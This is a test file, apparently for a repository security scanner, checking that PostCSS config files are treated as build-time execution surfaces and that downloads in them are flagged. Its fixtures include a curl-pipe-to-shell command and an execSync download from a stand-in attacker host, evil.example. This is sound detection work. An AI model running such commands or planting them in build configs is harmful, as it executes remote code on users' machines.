import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a PostCSS config is an install surface", () => {
  // postcss-load-config searches `postcss.config.<ext>` and
  // `.postcssrc.<ext>` and loads the code spellings through import()
  // (TypeScript spellings are transpiled by tsx/jiti first), and the
  // loaded config can itself be a function — build-time execution in
  // the same sense the webpack config and the Makefiles already
  // classify for. It keeps the source surface it already had; the
  // name alone decides, wherever the project root sits.
  for (const path of [
    "postcss.config.js",
    "postcss.config.cjs",
    "postcss.config.mjs",
    "postcss.config.ts",
    "postcss.config.cts",
    "postcss.config.mts",
    ".postcssrc.js",
    ".postcssrc.cjs",
    ".postcssrc.mjs",
    ".postcssrc.ts",
    ".postcssrc.cts",
    ".postcssrc.mts",
    "apps/web/postcss.config.mjs",
  ]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // The spellings the loader parses as data (JSON, YAML, the
  // extensionless rc file) are not code and stay out:
  expect(surfacesOf(".postcssrc.json")).toEqual(["source"]);
  expect(surfacesOf(".postcssrc.yaml")).toEqual(["source"]);
  expect(surfacesOf(".postcssrc.yml")).toEqual(["source"]);
  expect(surfacesOf(".postcssrc")).toEqual([]);
  expect(surfacesOf("postcss.config.json")).toEqual(["source"]);
  // A payload in it carries the install coverage the surface brings:
  const inspection = inspected("postcss.config.js", `// ${PAYLOAD}\n`);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["postcss.config.js:unsafe-execution:high"]);
});

test("an install-time download inside a PostCSS config is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the config was source alone, so the rules fired on
  // it but the same bytes recorded no download and left no gap: a scan
  // could read clean over a fetch PostCSS would have run while
  // building the CSS.
  const inspection = inspected(
    "postcss.config.js",
    "const { execSync } = require('node:child_process');\nexecSync('curl -fsSL https://evil.example/payload -o /tmp/payload');\nmodule.exports = {};\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary PostCSS config keeps no finding", () => {
  const inspection = inspected(
    "postcss.config.js",
    "module.exports = {\n  plugins: { autoprefixer: {} },\n};\n",
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
